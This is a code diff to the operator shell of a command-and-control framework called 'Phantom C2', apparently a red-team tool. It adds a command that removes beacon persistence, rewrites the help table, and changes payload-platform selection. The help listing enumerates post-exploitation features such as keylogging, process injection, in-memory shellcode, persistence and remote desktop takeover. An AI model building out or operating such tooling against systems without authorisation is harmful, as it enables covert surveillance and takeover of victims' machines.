@@ -619,8 +619,34 @@ class C2Shell(cmd.Cmd):
             notifier.success(f"Persistence task queued: {method}")
             notifier.info(f"Task ID: {task_id}")
 
+    def do_unpersist(self, arg):
+        """unpersist [name] - Remove the persistence the beacon installed.
+
+        Reverses do_persist with the SAME artifacts (RunKey value / systemd
+        unit / autostart file / cron line / on-disk copy): the report hands
+        the client the way back out, and this is it. Invoking it on a beacon
+        that never installed persistence is a no-op, not an error.
+        """
+        if not self.active_beacon:
+            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
+            return
+        name = (arg or "").strip()
+        cmd = f"unpersist {name}".strip()
+        task_id = c2_state.queue_task(self.active_beacon, cmd)
+        notifier.success("Unpersist task queued: removes the same paths "
+                         "persist installed.")
+        notifier.info(f"Task ID: {task_id}")
+
     def do_help(self, arg: str):
-        """help [command] - Show the C2 command reference."""
+        """help [command] - Show the C2 command reference for the current context
+
+        With no argument this shows the commands that make sense WHERE YOU
+        ARE: the global context lists listener/beacon-registry/payload
+        commands and names the beacon-scoped ones with the prerequisite that
+        unlocks them; after `interact <id>` it lists the commands you can
+        send to that beacon. A command that cannot run right now says so
+        instead of being hidden or, worse, looking available.
+        """
         if arg.strip():
             func = getattr(self, f"do_{arg.strip().replace('-', '_')}", None)
             if func and func.__doc__:
@@ -632,54 +658,52 @@ class C2Shell(cmd.Cmd):
                 notifier.error(f"No help available for '{arg}'.")
             return
 
-        table = Table(title="[bold]Phantom C2 Commands[/]", border_style="magenta")
+        from phantom.core.c2_help import (
+            BEACON_SCOPE, GLOBAL_SCOPE, commands_for, grouped, is_available,
+        )
+
+        beacon = getattr(self, "active_beacon", "") or ""
+        beacon_os = ""
+        if beacon:
+            try:
+                beacon_os = str((c2_state.get_beacons().get(beacon, {}) or {})
+                                .get("os", "") or "")
+            except Exception:
+                beacon_os = ""
+
+        if beacon:
+            title = f"[bold]Beacon {beacon} — commands sent to it[/]"
+            specs = commands_for(BEACON_SCOPE)
+        else:
+            title = "[bold]C2 Global Commands[/]"
+            specs = commands_for(GLOBAL_SCOPE)
+
+        table = Table(title=title, border_style="magenta")
         table.add_column("Command", style="cyan")
         table.add_column("Description", style="white")
-        rows = [
-            # ── listener & infrastructure ──
-            ("listeners start [port] [host] [use_ssl]", "Start the C2 listener (default HTTPS + mTLS)"),
-            ("listeners stop", "Stop the C2 listener"),
-            ("listeners", "Show listener status"),
-            ("certs [status|uninstall]", "Inspect or remove TLS certificate pair"),
-            ("config [status|rotate-api-token|mtls-on|mtls-off]",
-             "Show/rotate auto-generated C2 secrets & mTLS toggle"),
-            ("malleable [show|save|recommend]", "Manage malleable C2 profiles (URIs, UA, headers)"),
-            # ── beacons ──
-            ("beacons", "List active beacons with live status"),
-            ("interact <id>", "Enter a beacon terminal (commands go to the beacon)"),
-            ("back", "Return to global C2 context"),
-            ("results [n|all]", "Show results for the active beacon"),
-            ("beacon-auth [status|rotate|revoke] [id]", "Manage per-beacon HMAC identity keys"),
-            ("beacon-help", "List ALL commands supported by the beacon agent"),
-            ("health", "Beacon health self-report (uptime, check-ins, tasks, cadence)"),
-            ("set-sleep <ms> [jitter%]", "Rotate beacon cadence mid-session (no restart)"),
-            # ── post-exploitation (tasks sent to the active beacon) ──
-            ("screenshot", "Capture a screenshot on the active beacon"),
-            ("keylog start|stop|status|dump", "Keystroke logger on the active beacon (dump = retrieve buffer)"),
-            ("persist [method]", "Install persistence (runkey/systemd/cron — auto with autopersist)"),
-            ("autopersist", "Auto-detect OS and install the right persistence"),
-            ("inject <pid>", "Inject a new beacon into an existing process (2 beacons)"),
-            ("inject-tl <pid> | inject-eb <pid>", "Thread-layout / early-bird injection variants"),
-            ("migrate", "Hollow a new process and move the beacon (1 beacon)"),
-            ("mem-run <b64>", "Run base64 shellcode in-memory (Windows)"),
-            ("remote [host] [port] [ssl]", "Deploy the standalone Remote Session module (GUI takeover)"),
-            ("remote-view [gui|off]", "Browser viewer for the remote stream (gui = full control) or ASCII watch"),
-            ("remote-open", "Open the newest full-res remote frame in the image viewer"),
-            ("screen-watch [gui]", "Watch beacon screen recordings: gui = browser player (live + saved)"),
-            ("screen-open [name]", "Open a saved screen recording (mp4) in the OS player"),
-            # ── payloads & delivery ──
-            ("generate [platform] [--profile <json>]", "Compile + dropper (optionally with malleable profile)"),
-            ("generate-shellcode [platform]", "Generate base64 shellcode for inject/migrate/mem-run"),
-            ("payloads", "List generated payloads on disk"),
-            # ── ops & audit ──
-            ("audit [verify|tail N]", "Immutable hash-chained C2 audit log (chain-of-custody)"),
-            ("telegram", "Telegram bot channel status (remote C2 control)"),
-            ("exit / quit", "Exit the C2 shell"),
-        ]
-        for cmd, desc in rows:
-            table.add_row(cmd, desc)
+        table.add_column("State", style="yellow")
+
+        # Usage strings are full of [optional] placeholders, which rich would
+        # otherwise swallow as markup — `generate [platform]` has to reach the
+        # operator intact.
+        from rich.markup import escape
+
+        for category, items in grouped(specs):
+            table.add_row(f"[bold magenta]{escape(category)}[/]", "", "")
+            for spec in items:
+                ready = is_available(spec, active_beacon=beacon,
+                                     beacon_os=beacon_os)
+                note = "" if ready else spec.state_note()
+                table.add_row(escape(spec.usage), escape(spec.description),
+                              note or "available")
+
         console.print(table)
-        console.print("[dim]Type 'help <command>' for details.[/]")
+        if not beacon:
+            console.print("[dim]Beacon-scoped commands need "
+                          "`interact <id>` first — they are listed with the "
+                          "prerequisite that unlocks them.[/dim]")
+        console.print("[dim]Type 'help <command>' for details, "
+                      "'beacon-help' for the raw agent command list.[/dim]")
         console.print(f"[dim]PHANTOM.C2 v3.0.0 — {_c2_elapsed()} since session start[/dim]")
 
     def do_beacon_help(self, arg):
@@ -1268,8 +1292,17 @@ class C2Shell(cmd.Cmd):
                 platform = answer.platform
                 notifier.info(f"Detected {platform} target from scan "
                               f"results. Defaulting to '{platform}'.")
-            elif answer.os_name:
-                platform = ""      # a scan that says nothing usable
+            elif answer.known:
+                # The scan DID recognise an OS, just not one this builder
+                # targets (an appliance, a phone, a switch). Say that plainly:
+                # the old path set platform="" and fell through to the generic
+                # "Invalid platform" check, which read as if the OPERATOR had
+                # typed something wrong.
+                notifier.error(
+                    f"Scan reports {answer.os_name}, which has no beacon "
+                    f"target. Build for the platform explicitly:\n"
+                    f"  generate windows|linux|macos|android")
+                return
             else:
                 import sys
                 valid_platforms_local = ["windows", "linux", "macos", "android"]
@@ -1286,8 +1319,17 @@ class C2Shell(cmd.Cmd):
                         notifier.warn("No platform selected; aborting generation.")
                         return
                 else:
-                    notifier.warn("No platform detected and non-interactive session. Defaulting to 'windows'.")
-                    platform = "windows"
+                    # Non-interactive with nothing to go on: REFUSE. The old
+                    # behaviour silently built a Windows PE, so a scripted
+                    # `generate` on a Linux box produced an artefact that
+                    # could never run and reported success. A wrong-but-obvious
+                    # artefact is worse than a missing one: the operator is
+                    # the only one who knows which box this engagement is on.
+                    notifier.error(
+                        "No platform detected and this is a non-interactive "
+                        "session: refusing to guess. Pass it explicitly:\n"
+                        "  generate windows|linux|macos|android [--arch x64]")
+                    return
         
         valid_platforms = ["windows", "linux", "macos", "android"]
         if platform not in valid_platforms:
